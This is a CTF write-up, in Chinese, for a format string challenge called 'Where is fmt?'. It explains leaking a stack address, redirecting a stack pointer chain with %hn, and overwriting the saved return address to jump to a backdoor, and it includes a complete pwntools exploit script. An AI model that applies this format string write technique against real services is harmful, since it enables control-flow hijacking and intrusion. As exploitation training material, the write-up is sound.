# Where is fmt?

## 题目简述

格式化字符串本身位于 `.bss`，程序只给三次调用机会。栈上没有直接指向保存返回地址的参数，但存在一条可改写的栈指针链：第一次泄漏栈地址，第二次把链中指针改为指向保存返回地址，第三次再通过新指针写入后门地址。

## 解题过程

第一轮用第 15 个参数泄漏栈地址。根据本题固定栈布局，泄漏值减 `0x120` 得到保存返回地址的位置：

```text
%15$p
```

第二轮仍通过 `%15$hn`，只改目标指针的低 16 位，让它指向刚算出的返回地址。第三轮中，这条被重定向的指针出现在第 45 个格式化参数位置，于是可用 `%45$hn` 把返回地址低 16 位改成后门地址。完整的纯 pwntools 脚本如下，不依赖原稿中的私有 `ctools`：

```python
from pwn import ELF, log, remote

elf = ELF("./pwn")
io = remote("host", 10000)

io.sendlineafter(b"3 chances", b"%15$p")
io.recvuntil(b"0x")
saved_ret = int(io.recvn(12), 16) - 0x120
log.success(f"saved return address: {saved_ret:#x}")

retarget = f"%{saved_ret & 0xffff}c%15$hn".encode()
io.sendlineafter(b"chances", retarget)

# 反汇编中入口前四字节为 endbr64，再下一字节为 push rbp；+5 跳过二者。
backdoor = elf.sym["backdoor"] + 5
overwrite = f"%{backdoor & 0xffff}c%45$hn".encode()
io.sendlineafter(b"chances", overwrite)
io.interactive()
```

这里使用 `%hn` 只写两个字节，是因为栈地址和 PIE 内代码地址的高位已经正确；一次性用 `%n` 写满八字节反而需要打印不可行数量的字符并会破坏高位。

## 方法总结

当格式化字符串参数中没有直接可写目标时，应检查栈上的指针链。典型打法是“泄漏目标地址 → 半字改写中间指针 → 经改写后的指针写最终目标”。参数序号、`0x120` 偏移和后门入口修正都来自本题栈布局，迁移到其他二进制时必须重新测量。
